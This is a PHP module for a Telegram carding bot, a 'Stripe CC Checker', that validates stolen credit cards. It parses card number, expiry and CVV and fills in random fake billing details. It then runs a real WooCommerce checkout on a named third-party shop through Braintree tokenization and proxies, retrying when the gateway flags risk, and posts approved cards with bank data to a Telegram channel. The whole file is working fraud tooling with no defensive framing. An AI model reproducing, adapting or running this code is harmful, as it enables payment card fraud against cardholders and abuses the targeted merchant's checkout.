<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
$time_start = microtime(true);
$response = "";
////////////====[MUTE]====////////////
if(strpos($message, "/as") === 0 || strpos($message, "!as") === 0 || strpos($message, ".as") === 0){
    $cookie = randomString();
    $trans_completed = false;
    $tries = 0;
    $limit = 6;
    while ($trans_completed == false && $tries < $limit ||strpos($response, 'Gateway Rejected: risk_threshold!')) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

    } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for Result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

     ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 4);

  if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
         $creditcard = $matches[0][0];
      $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
      $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
      $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
      $yy = "20". str_replace("20","",$yy);
      $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
      $yy1 = substr($yy, 2, 2);
      $bin = substr($cc, 0, 6);
      $cbin = substr($cc, 0, 1);
      ###CHECKER PART###
      $binlist = json_decode(fbankinfo($bin), true);
      $ccbank = $binlist['Bank'];
      $ccvendor = $binlist['Vendor'];
      $cctype = $binlist['Bank_Info'];
      $cc_country = $binlist['Country'];
      $abn = $binlist['Abn'];
      $cc_emoji = $binlist['emoji'];
      $lista = "$cc|$mm|$yy|$cvv";

      $info = json_decode(random_info(), true);
      $fname = $info['fname'];
      $lname = $info['lname'];
      $email = $info['email'];
      $street = $info['street'];
      $city = $info['city'];
      $state = $info['state'];
      $phone = $info['phone'];
      $postcode = $info['postcode'];
      ###CHECKER PART###
      $zip = rand(90010, 94000);
      if ($cbin == 5){
          $cbin = 'mastercard';
      } else if ($cbin == 4){
          $cbin = 'visa';
      }
      $Amount = 0.8;
      $str = substr(RandomString(), 0, 7);
      $cookie = RandomString();
         $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }

                /////////////////////==========[Unavailable if empty]==========////////////////


      $cookie = randomString();
      $str = substr(randomString(), 0, 7);
      $page =  cURL(
          'https://birdcagepress.com/?wc-ajax=add_to_cart',
          $headers = [
              'accept: application/json, text/javascript, */*; q=0.01',
              'content-type: application/x-www-form-urlencoded; charset=UTF-8',
              'referer: https://birdcagepress.com/shop/?orderby=price',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71',
              'x-requested-with: XMLHttpRequest',
          ],
          "product_sku=&product_id=316&quantity=1",
          "POST",
          1,
          $cookie
      );

      $checkout =  cURL(
          'https://birdcagepress.com/checkout/',
          $headers = [
              'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'referer: https://birdcagepress.com/cart/',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71',
          ],
          '',
          "GET",
          1,
          $cookie
      ); $wp_nonce = GetStr($checkout, 'name="woocommerce-process-checkout-nonce" value="', '"');
      $cc_nonce = GetStr($checkout, '"type":"credit_card","client_token_nonce":"', '"');

      $ajax =  cURL(
          'https://birdcagepress.com/wp-admin/admin-ajax.php',
          $headers = [
              'accept: */*',
              'content-type: application/x-www-form-urlencoded; charset=UTF-8',
              'referer: https://birdcagepress.com/checkout/',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71',
              'x-requested-with: XMLHttpRequest',
          ],
          "action=wc_braintree_credit_card_get_client_token&nonce=$cc_nonce",
          "POST",
          1,
          $cookie
      );  $data = json_decode(base64_decode(GetStr($ajax, '"data":"', '"')),true);
      $fprint = $data['authorizationFingerprint'];

      $graphl =  cURL_ProxyOn(
          'https://payments.braintree-api.com/graphql',
          $headers = [
              'Accept: */*',
              'Authorization: Bearer '.$fprint,
              'Braintree-Version: 2018-05-10',
              'Content-Type: application/json',
              'Origin: https://assets.braintreegateway.com',
              'Referer: https://assets.braintreegateway.com/',
              'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71'
          ],
          '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
          "POST",
          1,
          $cookie
      );$token = GetStr($graphl, '"token":"', '"');
        $execute =  cURL_ProxyOn(
          'https://birdcagepress.com/?wc-ajax=checkout',
          $headers = [
              'accept: application/json, text/javascript, */*; q=0.01',
              'content-type: application/x-www-form-urlencoded; charset=UTF-8',
              'referer: https://birdcagepress.com/shop/?orderby=price',
              'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71',
              'x-requested-with: XMLHttpRequest',
          ],
          "billing_first_name=$fname&billing_last_name=$lname$&billing_company=$&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=CA&billing_postcode=$postcode&billing_phone=1212512".rand(1111,9999)."&billing_email=$email&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=CA&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=17.69&wc_braintree_credit_card_payment_nonce=$token&wc_braintree_paypal_payment_nonce=&wc_braintree_paypal_amount=17.69&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&woocommerce-process-checkout-nonce=$wp_nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
          "POST",
          1,
          $cookie
      );


         $response = GetStr($execute, '      <li>', '<\/li>');
             $dcode = GetStr($execute, '"result":"', '"');

      $time = number_format(microtime(true) - $time_start, 2);
         if (strpos($execute,'"result":"success"')){
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    addCCN();
                    addUserCCN($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅ 
<b>Card -»</b> <code>$lista</code>
Response -» Approved
Type -» CVV 
Gateway -» BRAINTREE CHARGE - 9$
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);$trans_completed = true;

                }  elseif(strpos($execute, '"result":"failure"')){
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Code -» $dcode 
Type -» CVV 
Gateway -» BRAINTREE CHARGE - 9$
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                } else {
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» Unknown
Code -» $dcode 
Type -» CVV 
Gateway -» BRAINTREE CHARGE - 9$
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                }

            } else {
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                    'parse_mode' => 'html', 'disable_web_page_preview' => 'true'

                ]);$confirm_method = true;
            }
        }

    }
}


?>
